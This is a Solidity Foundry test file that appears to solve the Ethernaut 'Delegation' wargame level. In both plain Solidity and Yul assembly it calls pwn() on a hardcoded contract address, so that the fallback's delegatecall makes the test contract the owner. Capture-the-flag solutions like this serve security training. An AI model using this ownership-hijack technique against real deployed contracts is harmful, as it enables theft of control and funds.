// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {IDelegate} from "ethernaut/IDelegate.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract DelegateTest is BaseTest {
    // Using IDelegation address with IDelegate interface
    IDelegate public delegatorInstance = IDelegate(0x7B073D1D88b2A08d02DB38B9367A2ede5cea2E70);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        delegatorInstance.pwn();
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(delegatorInstance.owner(), address(this));
    }

    function exploitYul() internal override {
        assembly {
            mstore(0, 0xdd365b8b)
            pop(call(gas(), sload(delegatorInstance.slot), 0, 28, 4, 0, 0))
        }
    }

    function testExploitYul() public override {
        exploitYul();
        assertEq(delegatorInstance.owner(), address(this));
    }
}
